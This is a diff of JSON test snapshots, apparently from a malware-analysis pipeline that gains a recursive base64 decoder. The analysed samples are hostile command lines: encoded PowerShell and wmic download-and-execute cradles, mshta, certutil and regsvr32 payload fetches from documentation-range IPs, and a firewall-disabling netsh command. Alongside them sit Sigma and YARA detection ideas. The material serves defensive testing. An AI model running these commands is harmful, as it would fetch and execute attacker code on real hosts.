@@ -9,7 +9,7 @@
         "analyze_stable": true,
         "die_stable": true,
         "run1_snapshot": {
-          "evidence_count": 3,
+          "evidence_count": 6,
           "intent_confidence_bucket": 0.3,
           "intent_objective": "Uncategorised",
           "intent_phases_observed": [
@@ -34,12 +34,17 @@
           ],
           "mitre_from_techniques": [
             "T1027",
+            "T1059.001",
+            "T1105",
+            "T1140",
             "T1562.001",
             "T1564.003"
           ],
           "mitre_ids": [
             "T1027",
             "T1059.001",
+            "T1105",
+            "T1140",
             "T1562.001",
             "T1564.003"
           ],
@@ -69,7 +74,7 @@
           "verdict_label": "Malicious"
         },
         "run2_snapshot": {
-          "evidence_count": 3,
+          "evidence_count": 6,
           "intent_confidence_bucket": 0.3,
           "intent_objective": "Uncategorised",
           "intent_phases_observed": [
@@ -94,12 +99,17 @@
           ],
           "mitre_from_techniques": [
             "T1027",
+            "T1059.001",
+            "T1105",
+            "T1140",
             "T1562.001",
             "T1564.003"
           ],
           "mitre_ids": [
             "T1027",
             "T1059.001",
+            "T1105",
+            "T1140",
             "T1562.001",
             "T1564.003"
           ],
@@ -214,7 +224,7 @@
               }
             ]
           },
-          "elapsed_ms": 163.4,
+          "elapsed_ms": 211.2,
           "status": 200
         },
         "die": {
@@ -307,6 +317,24 @@
                     "evidence": "ExecutionPolicy Bypass / Unrestricted.",
                     "id": "T1562.001",
                     "name": "Disable or Modify Tools"
+                  },
+                  {
+                    "evidence": "Invoke-Expression / IEX / & alias.",
+                    "id": "T1059.001",
+                    "name": "PowerShell",
+                    "source": "recursive_decode"
+                  },
+                  {
+                    "evidence": "Download cradle (WebClient / iwr / curl).",
+                    "id": "T1105",
+                    "name": "Ingress Tool Transfer",
+                    "source": "recursive_decode"
+                  },
+                  {
+                    "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
+                    "id": "T1140",
+                    "name": "Deobfuscate/Decode Files or Information",
+                    "source": "recursive_decode"
                   }
                 ],
                 "token_count": 9,
@@ -402,6 +430,17 @@
                   },
                   "position": 0,
                   "verb": null
+                }
+              ],
+              "decoded_layers": [
+                {
+                  "b64_sha256": "e12e490375f89988fcbe4f083721ba8763882f0da833d006b5e27fc41c1a3706",
+                  "decoded_preview": "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/payload.ps1')",
+                  "decoded_sha256": "809ced812c44c5b4876b136676894fcaf17c1d5bbb23de07edc02285ea4dd34d",
+                  "depth": 0,
+                  "encoding": "utf-16le",
+                  "pattern_index": 0,
+                  "source_offset": 49
                 }
               ],
               "dkp_matches": [
@@ -518,17 +557,35 @@
                   "evidence": "ExecutionPolicy Bypass / Unrestricted.",
                   "id": "T1562.001",
                   "name": "Disable or Modify Tools"
+                },
+                {
+                  "evidence": "Invoke-Expression / IEX / & alias.",
+                  "id": "T1059.001",
+                  "name": "PowerShell",
+                  "source": "recursive_decode"
+                },
+                {
+                  "evidence": "Download cradle (WebClient / iwr / curl).",
+                  "id": "T1105",
+                  "name": "Ingress Tool Transfer",
+                  "source": "recursive_decode"
+                },
+                {
+                  "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
+                  "id": "T1140",
+                  "name": "Deobfuscate/Decode Files or Information",
+                  "source": "recursive_decode"
                 }
               ]
             }
           },
-          "elapsed_ms": 111.6,
+          "elapsed_ms": 137.7,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window), `T1562.001` (Impair Defenses: Disable or Modify Tools).",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window), `T1562.001` (Impair Defenses: Disable or Modify Tools), `T1140` (Deobfuscate/Decode Files or Information). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "behavior_summary": [
                 {
                   "activity": "1 technique(s) observed (T1059.001). Attacker objective: Execute attacker code on the endpoint.",
@@ -536,48 +593,58 @@
                   "phase": "Execution"
                 },
                 {
-                  "activity": "3 technique(s) observed (T1027, T1564.003, T1562.001). Attacker objective: Evade EDR / AV detection.",
+                  "activity": "4 technique(s) observed (T1027, T1564.003, T1562.001, T1140). Attacker objective: Evade EDR / AV detection.",
                   "kill_chain": "Defense Evasion",
                   "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
                 }
               ],
-              "executive_summary": "Investigation surface exposes 4 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Execution** (1 tech.), **Defense Evasion** (3 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "executive_summary": "Investigation surface exposes 6 MITRE ATT&CK technique(s) mapped across 3 tactic(s): **Execution** (1 tech.), **Defense Evasion** (4 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "likely_objective": [
                 "Execute attacker code on the endpoint",
-                "Evade EDR / AV detection"
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 36,
-                "confidence": "Medium",
+                "attack_progress_pct": 45,
+                "confidence": "High",
                 "primary_objective": "Evade EDR / AV detection",
                 "risk": "High"
               },
               "recommended_actions": [
                 "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
                 "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
                 "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
                 "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
                 "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution.",
                 "[T1562.001] Alert on `Set-MpPreference -DisableRealtimeMonitoring`, `sc stop WinDefend`, `reg add ... EnableLUA=0`, and any modification of `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender`.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
                 "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
               ],
               "sigma_hunts": [
                 "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
                 "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
                 "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)",
-                "Sigma: powershell Set-MpPreference OR reg.exe modifying `\\Windows Defender\\DisableAntiSpyware`"
+                "Sigma: powershell Set-MpPreference OR reg.exe modifying `\\Windows Defender\\DisableAntiSpyware`",
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
               ],
               "threat_actor_context": "",
               "yara_ideas": [
                 "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
                 "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
                 "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\"",
-                "YARA: strings \"DisableRealtimeMonitoring\", \"DisableAntiSpyware\", \"sc stop WinDefend\""
+                "YARA: strings \"DisableRealtimeMonitoring\", \"DisableAntiSpyware\", \"sc stop WinDefend\"",
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
               ]
             }
           },
-          "elapsed_ms": 118.2,
+          "elapsed_ms": 135.3,
           "status": 200
         },
         "upload": {
@@ -605,7 +672,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 107.4,
+          "elapsed_ms": 144.6,
           "status": 200
         }
       },
@@ -693,7 +760,7 @@
               }
             ]
           },
-          "elapsed_ms": 170.9,
+          "elapsed_ms": 208.5,
           "status": 200
         },
         "die": {
@@ -786,6 +853,24 @@
                     "evidence": "ExecutionPolicy Bypass / Unrestricted.",
                     "id": "T1562.001",
                     "name": "Disable or Modify Tools"
+                  },
+                  {
+                    "evidence": "Invoke-Expression / IEX / & alias.",
+                    "id": "T1059.001",
+                    "name": "PowerShell",
+                    "source": "recursive_decode"
+                  },
+                  {
+                    "evidence": "Download cradle (WebClient / iwr / curl).",
+                    "id": "T1105",
+                    "name": "Ingress Tool Transfer",
+                    "source": "recursive_decode"
+                  },
+                  {
+                    "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
+                    "id": "T1140",
+                    "name": "Deobfuscate/Decode Files or Information",
+                    "source": "recursive_decode"
                   }
                 ],
                 "token_count": 9,
@@ -881,6 +966,17 @@
                   },
                   "position": 0,
                   "verb": null
+                }
+              ],
+              "decoded_layers": [
+                {
+                  "b64_sha256": "e12e490375f89988fcbe4f083721ba8763882f0da833d006b5e27fc41c1a3706",
+                  "decoded_preview": "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/payload.ps1')",
+                  "decoded_sha256": "809ced812c44c5b4876b136676894fcaf17c1d5bbb23de07edc02285ea4dd34d",
+                  "depth": 0,
+                  "encoding": "utf-16le",
+                  "pattern_index": 0,
+                  "source_offset": 49
                 }
               ],
               "dkp_matches": [
@@ -997,17 +1093,35 @@
                   "evidence": "ExecutionPolicy Bypass / Unrestricted.",
                   "id": "T1562.001",
                   "name": "Disable or Modify Tools"
+                },
+                {
+                  "evidence": "Invoke-Expression / IEX / & alias.",
+                  "id": "T1059.001",
+                  "name": "PowerShell",
+                  "source": "recursive_decode"
+                },
+                {
+                  "evidence": "Download cradle (WebClient / iwr / curl).",
+                  "id": "T1105",
+                  "name": "Ingress Tool Transfer",
+                  "source": "recursive_decode"
+                },
+                {
+                  "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
+                  "id": "T1140",
+                  "name": "Deobfuscate/Decode Files or Information",
+                  "source": "recursive_decode"
                 }
               ]
             }
           },
-          "elapsed_ms": 109.1,
+          "elapsed_ms": 105.4,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window), `T1562.001` (Impair Defenses: Disable or Modify Tools).",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window), `T1562.001` (Impair Defenses: Disable or Modify Tools), `T1140` (Deobfuscate/Decode Files or Information). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "behavior_summary": [
                 {
                   "activity": "1 technique(s) observed (T1059.001). Attacker objective: Execute attacker code on the endpoint.",
@@ -1015,48 +1129,58 @@
                   "phase": "Execution"
                 },
                 {
-                  "activity": "3 technique(s) observed (T1027, T1564.003, T1562.001). Attacker objective: Evade EDR / AV detection.",
+                  "activity": "4 technique(s) observed (T1027, T1564.003, T1562.001, T1140). Attacker objective: Evade EDR / AV detection.",
                   "kill_chain": "Defense Evasion",
                   "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
                 }
               ],
-              "executive_summary": "Investigation surface exposes 4 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Execution** (1 tech.), **Defense Evasion** (3 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "executive_summary": "Investigation surface exposes 6 MITRE ATT&CK technique(s) mapped across 3 tactic(s): **Execution** (1 tech.), **Defense Evasion** (4 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "likely_objective": [
                 "Execute attacker code on the endpoint",
-                "Evade EDR / AV detection"
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 36,
-                "confidence": "Medium",
+                "attack_progress_pct": 45,
+                "confidence": "High",
                 "primary_objective": "Evade EDR / AV detection",
                 "risk": "High"
               },
               "recommended_actions": [
                 "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
                 "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
                 "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
                 "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
                 "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution.",
                 "[T1562.001] Alert on `Set-MpPreference -DisableRealtimeMonitoring`, `sc stop WinDefend`, `reg add ... EnableLUA=0`, and any modification of `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender`.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
                 "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
               ],
               "sigma_hunts": [
                 "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
                 "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
                 "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)",
-                "Sigma: powershell Set-MpPreference OR reg.exe modifying `\\Windows Defender\\DisableAntiSpyware`"
+                "Sigma: powershell Set-MpPreference OR reg.exe modifying `\\Windows Defender\\DisableAntiSpyware`",
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
               ],
               "threat_actor_context": "",
               "yara_ideas": [
                 "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
                 "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
                 "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\"",
-                "YARA: strings \"DisableRealtimeMonitoring\", \"DisableAntiSpyware\", \"sc stop WinDefend\""
+                "YARA: strings \"DisableRealtimeMonitoring\", \"DisableAntiSpyware\", \"sc stop WinDefend\"",
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
               ]
             }
           },
-          "elapsed_ms": 101.5,
+          "elapsed_ms": 98.1,
           "status": 200
         },
         "upload": {
@@ -1084,7 +1208,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 100.8,
+          "elapsed_ms": 145.8,
           "status": 200
         }
       }
@@ -1264,7 +1388,7 @@
               }
             ]
           },
-          "elapsed_ms": 3913.0,
+          "elapsed_ms": 2340.1,
           "status": 200
         },
         "die": {
@@ -1449,7 +1573,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 96.6,
+          "elapsed_ms": 106.6,
           "status": 200
         },
         "narrate": {
@@ -1483,7 +1607,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.0,
+          "elapsed_ms": 108.9,
           "status": 200
         },
         "upload": {
@@ -1511,7 +1635,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 113.8,
+          "elapsed_ms": 99.9,
           "status": 200
         }
       },
@@ -1585,7 +1709,7 @@
               }
             ]
           },
-          "elapsed_ms": 2101.1,
+          "elapsed_ms": 4129.1,
           "status": 200
         },
         "die": {
@@ -1770,7 +1894,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 98.0,
+          "elapsed_ms": 106.8,
           "status": 200
         },
         "narrate": {
@@ -1804,7 +1928,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 105.6,
+          "elapsed_ms": 102.1,
           "status": 200
         },
         "upload": {
@@ -1832,7 +1956,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 129.9,
+          "elapsed_ms": 104.8,
           "status": 200
         }
       }
@@ -2037,7 +2161,7 @@
               }
             ]
           },
-          "elapsed_ms": 1335.1,
+          "elapsed_ms": 1135.0,
           "status": 200
         },
         "die": {
@@ -2257,7 +2381,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.5,
+          "elapsed_ms": 103.1,
           "status": 200
         },
         "narrate": {
@@ -2317,7 +2441,7 @@
               ]
             }
           },
-          "elapsed_ms": 107.4,
+          "elapsed_ms": 104.7,
           "status": 200
         },
         "upload": {
@@ -2345,7 +2469,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 98.6,
+          "elapsed_ms": 147.4,
           "status": 200
         }
       },
@@ -2428,7 +2552,7 @@
               }
             ]
           },
-          "elapsed_ms": 1574.9,
+          "elapsed_ms": 8232.3,
           "status": 200
         },
         "die": {
@@ -2648,7 +2772,7 @@
               ]
             }
           },
-          "elapsed_ms": 100.4,
+          "elapsed_ms": 108.4,
           "status": 200
         },
         "narrate": {
@@ -2708,7 +2832,7 @@
               ]
             }
           },
-          "elapsed_ms": 103.0,
+          "elapsed_ms": 97.7,
           "status": 200
         },
         "upload": {
@@ -2736,7 +2860,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 113.4,
+          "elapsed_ms": 103.0,
           "status": 200
         }
       }
@@ -2925,7 +3049,7 @@
               }
             ]
           },
-          "elapsed_ms": 1324.4,
+          "elapsed_ms": 896.4,
           "status": 200
         },
         "die": {
@@ -3177,7 +3301,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 102.5,
+          "elapsed_ms": 133.7,
           "status": 200
         },
         "narrate": {
@@ -3230,7 +3354,7 @@
               ]
             }
           },
-          "elapsed_ms": 99.5,
+          "elapsed_ms": 131.5,
           "status": 200
         },
         "upload": {
@@ -3258,7 +3382,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 142.6,
+          "elapsed_ms": 131.8,
           "status": 200
         }
       },
@@ -3339,7 +3463,7 @@
               }
             ]
           },
-          "elapsed_ms": 1925.2,
+          "elapsed_ms": 1168.7,
           "status": 200
         },
         "die": {
@@ -3591,7 +3715,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 100.5,
+          "elapsed_ms": 105.0,
           "status": 200
         },
         "narrate": {
@@ -3644,7 +3768,7 @@
               ]
             }
           },
-          "elapsed_ms": 107.2,
+          "elapsed_ms": 206.6,
           "status": 200
         },
         "upload": {
@@ -3672,7 +3796,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 103.8,
+          "elapsed_ms": 102.8,
           "status": 200
         }
       }
@@ -3950,7 +4074,7 @@
               }
             ]
           },
-          "elapsed_ms": 2291.3,
+          "elapsed_ms": 936.2,
           "status": 200
         },
         "die": {
@@ -4355,7 +4479,7 @@
               ]
             }
           },
-          "elapsed_ms": 117.6,
+          "elapsed_ms": 99.9,
           "status": 200
         },
         "narrate": {
@@ -4431,7 +4555,7 @@
               ]
             }
           },
-          "elapsed_ms": 140.8,
+          "elapsed_ms": 95.4,
           "status": 200
         },
         "upload": {
@@ -4459,7 +4583,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 267.4,
+          "elapsed_ms": 106.2,
           "status": 200
         }
       },
@@ -4589,7 +4713,7 @@
               }
             ]
           },
-          "elapsed_ms": 8469.1,
+          "elapsed_ms": 890.8,
           "status": 200
         },
         "die": {
@@ -4994,7 +5118,7 @@
               ]
             }
           },
-          "elapsed_ms": 108.6,
+          "elapsed_ms": 105.3,
           "status": 200
         },
         "narrate": {
@@ -5070,7 +5194,7 @@
               ]
             }
           },
-          "elapsed_ms": 108.2,
+          "elapsed_ms": 95.6,
           "status": 200
         },
         "upload": {
@@ -5098,7 +5222,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 131.1,
+          "elapsed_ms": 103.8,
           "status": 200
         }
       }
@@ -5220,7 +5344,7 @@
               }
             ]
           },
-          "elapsed_ms": 228.4,
+          "elapsed_ms": 156.0,
           "status": 200
         },
         "die": {
@@ -5237,7 +5361,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 105.8,
+          "elapsed_ms": 109.3,
           "status": 200
         },
         "narrate": {
@@ -5252,7 +5376,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 101.3,
+          "elapsed_ms": 100.1,
           "status": 200
         },
         "upload": {
@@ -5280,7 +5404,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 143.7,
+          "elapsed_ms": 127.3,
           "status": 200
         }
       },
@@ -5324,7 +5448,7 @@
               }
             ]
           },
-          "elapsed_ms": 153.4,
+          "elapsed_ms": 152.5,
           "status": 200
         },
         "die": {
@@ -5341,7 +5465,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 104.7,
+          "elapsed_ms": 106.9,
           "status": 200
         },
         "narrate": {
@@ -5356,7 +5480,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.2,
+          "elapsed_ms": 97.9,
           "status": 200
         },
         "upload": {
@@ -5384,7 +5508,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 107.8,
+          "elapsed_ms": 105.9,
           "status": 200
         }
       }
@@ -5530,7 +5654,7 @@
               }
             ]
           },
-          "elapsed_ms": 174.2,
+          "elapsed_ms": 152.4,
           "status": 200
         },
         "die": {
@@ -5610,7 +5734,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 121.1,
+          "elapsed_ms": 106.1,
           "status": 200
         },
         "narrate": {
@@ -5625,7 +5749,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 98.5,
+          "elapsed_ms": 98.2,
           "status": 200
         },
         "upload": {
@@ -5653,7 +5777,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 100.7,
+          "elapsed_ms": 99.3,
           "status": 200
         }
       },
@@ -5713,7 +5837,7 @@
               }
             ]
           },
-          "elapsed_ms": 150.4,
+          "elapsed_ms": 281.0,
           "status": 200
         },
         "die": {
@@ -5793,7 +5917,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 125.6,
+          "elapsed_ms": 100.5,
           "status": 200
         },
         "narrate": {
@@ -5808,7 +5932,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.2,
+          "elapsed_ms": 99.6,
           "status": 200
         },
         "upload": {
@@ -5836,7 +5960,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 100.1,
+          "elapsed_ms": 103.4,
           "status": 200
         }
       }
@@ -5849,14 +5973,16 @@
         "analyze_stable": true,
         "die_stable": true,
         "run1_snapshot": {
-          "evidence_count": 3,
+          "evidence_count": 5,
           "intent_confidence_bucket": 0.3,
           "intent_objective": "Uncategorised",
           "intent_phases_observed": [
             "Defense Evasion"
           ],
-          "ioc_count": 0,
-          "ioc_kinds": [],
+          "ioc_count": 1,
+          "ioc_kinds": [
+            "url"
+          ],
           "language": "powershell",
           "lolbins": [
             "powershell"
@@ -5872,11 +5998,15 @@
           "mitre_from_techniques": [
             "T1027",
             "T1059.001",
+            "T1105",
+            "T1140",
             "T1564.003"
           ],
           "mitre_ids": [
             "T1027",
             "T1059.001",
+            "T1105",
+            "T1140",
             "T1564.003"
           ],
           "obfuscation_score": 0
@@ -5905,14 +6035,16 @@
           "verdict_label": "Malicious"
         },
         "run2_snapshot": {
-          "evidence_count": 3,
+          "evidence_count": 5,
           "intent_confidence_bucket": 0.3,
           "intent_objective": "Uncategorised",
           "intent_phases_observed": [
             "Defense Evasion"
           ],
-          "ioc_count": 0,
-          "ioc_kinds": [],
+          "ioc_count": 1,
+          "ioc_kinds": [
+            "url"
+          ],
           "language": "powershell",
           "lolbins": [
             "powershell"
@@ -5928,11 +6060,15 @@
           "mitre_from_techniques": [
             "T1027",
             "T1059.001",
+            "T1105",
+            "T1140",
             "T1564.003"
           ],
           "mitre_ids": [
             "T1027",
             "T1059.001",
+            "T1105",
+            "T1140",
             "T1564.003"
           ],
           "obfuscation_score": 0
@@ -6046,7 +6182,7 @@
               }
             ]
           },
-          "elapsed_ms": 154.5,
+          "elapsed_ms": 155.6,
           "status": 200
         },
         "die": {
@@ -6124,6 +6260,18 @@
                     "evidence": "-WindowStyle Hidden.",
                     "id": "T1564.003",
                     "name": "Hide Artifacts: Hidden Window"
+                  },
+                  {
+                    "evidence": "Download cradle (WebClient / iwr / curl).",
+                    "id": "T1105",
+                    "name": "Ingress Tool Transfer",
+                    "source": "recursive_decode"
+                  },
+                  {
+                    "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
+                    "id": "T1140",
+                    "name": "Deobfuscate/Decode Files or Information",
+                    "source": "recursive_decode"
                   }
                 ],
                 "token_count": 6,
@@ -6204,8 +6352,35 @@
                   "verb": null
                 }
               ],
+              "decoded_layers": [
+                {
+                  "b64_sha256": "e1a8e99e2c75ed540fda91dc6718f44e9a9a6bce9348ba886f128bb83a7fbbda",
+                  "decoded_preview": "powershell -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMgAzAC4AMTAALgAxADIALwBpAG4AZwAnACkA",
+                  "decoded_sha256": "b0980a0653eba399bfbf66d5a6fefb912318b79bc7ff9d1fcdb52432c2550ad1",
+                  "depth": 0,
+                  "encoding": "utf-8",
+                  "pattern_index": 1,
+                  "source_offset": 92
+                },
+                {
+                  "b64_sha256": "15424814a68b32a293e32406ae3e37d6c83e94ea23e09d18edd2876754fbc460",
+                  "decoded_preview": "IEX(New-Object Net.WebClient).DownloadString('http://223.\u3031\u2e00\u3100\u3200\u2f00\u6900\u6e00\u6700\u2700\u2900",
+                  "decoded_sha256": "cd486f306ad7407b1b0a33b7113b39ce8bbdf2da854fff484d57c4296e69fc81",
+                  "depth": 1,
+                  "encoding": "utf-16le",
+                  "pattern_index": 0,
+                  "source_offset": 11
+                }
+              ],
               "dkp_matches": [],
-              "iocs": [],
+              "iocs": [
+                {
+                  "confidence": 0.92,
+                  "kind": "url",
+                  "source": "recursive_decode",
